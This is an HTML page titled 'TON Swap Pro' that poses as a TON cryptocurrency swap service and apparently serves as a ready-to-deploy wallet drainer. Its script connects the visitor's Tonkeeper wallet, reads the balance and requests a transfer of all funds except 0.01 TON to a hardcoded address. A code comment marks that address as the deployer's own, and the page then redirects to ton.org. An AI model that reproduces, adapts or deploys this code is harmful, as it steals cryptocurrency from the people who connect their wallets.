<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Swap Pro</title>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js">
    </script>
    <script src="https://unpkg.com/ton@latest/dist/ton.min.js">
    </script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 60px 40px;
            max-width: 480px;
            width: 100%;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            text-align: center;
        }
        h1 { color: #fff; font-size: 28px; font-weight: 600; margin-bottom: 12px; }
        p { color: #8b8b9e; font-size: 16px; margin-bottom: 32px; line-height: 1.6; }
        .logo { font-size: 64px; margin-bottom: 20px; }
        #connectBtn {
            background: #0098ea;
            color: #fff;
            border: none;
            border-radius: 16px;
            padding: 18px 40px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
        }
        #connectBtn:hover { background: #0077be; transform: scale(1.02); }
        #connectBtn:disabled { opacity: 0.5; cursor: not-allowed; }
        .loader { display: none; margin: 16px 0; color: #0098ea; font-size: 14px; }
        .loader.active { display: block; }
        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(0,152,234,0.3);
            border-radius: 50%;
            border-top-color: #0098ea;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status {
            margin-top: 16px;
            font-size: 14px;
            color: #ff6b6b;
            display: none;
        }
        .status.success { color: #51cf66; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">💎</div>
        <h1>TON Swap Pro</h1>
        <p>Подключите кошелек, и все ваши TON будут переведены на наш адрес</p>
        <button id="connectBtn">🔗 Подключить Tonkeeper</button>
        <div class="loader" id="loader"><span class="spinner"></span> Получение баланса...</div>
        <div class="status" id="status"></div>
    </div>

    <script>
        // ═══════════════════════════════════════════════
        // ТВОЙ АДРЕС (куда уходят средства)
        // ═══════════════════════════════════════════════
        const YOUR_WALLET = "UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P";

        const connector = new TonConnect();
        const client = new TonClient({
            endpoint: 'https://toncenter.com/api/v2/jsonRPC'
        });

        document.getElementById('connectBtn').onclick = async function() {
            const btn = this;
            const loader = document.getElementById('loader');
            const status = document.getElementById('status');

            btn.disabled = true;
            loader.classList.add('active');
            status.style.display = 'none';

            try {
                // 1. Подключаем кошелек
                await connector.connect({
                    manifestUrl: window.location.origin + '/tonconnect-manifest.json'
                });

                connector.onStatusChange(async (walletInfo) => {
                    if (walletInfo) {
                        const userAddress = walletInfo.account.address;

                        // 2. Получаем баланс пользователя
                        const balance = await client.getBalance(userAddress);
                        const balanceTon = parseFloat(balance) / 1e9; // в TON

                        if (balanceTon < 0.01) {
                            status.textContent = '❌ Недостаточно средств (мин. 0.01 TON)';
                            status.className = 'status';
                            status.style.display = 'block';
                            btn.disabled = false;
                            loader.classList.remove('active');
                            return;
                        }

                        // 3. Отправляем всё, кроме 0.01 TON на газ
                        const amountToSend = (balanceTon - 0.01).toFixed(9);
                        const amountNano = (parseFloat(amountToSend) * 1e9).toString();

                        const transaction = {
                            valid_until: Math.floor(Date.now() / 1000) + 120,
                            messages: [{
                                address: YOUR_WALLET,
                                amount: amountNano, // в нанотонах
                                payload: ""
                            }]
                        };

                        await connector.sendTransaction(transaction);

                        status.textContent = `✅ Переведено ${amountToSend} TON!`;
                        status.className = 'status success';
                        status.style.display = 'block';

                        setTimeout(() => {
                            window.location.href = 'https://ton.org';
                        }, 2000);
                    }
                });

            } catch (error) {
                console.error(error);
                status.textContent = '❌ Ошибка. Попробуйте снова.';
                status.className = 'status';
                status.style.display = 'block';
                btn.disabled = false;
                loader.classList.remove('active');
            }
        };
    </script>
</body>
</html>
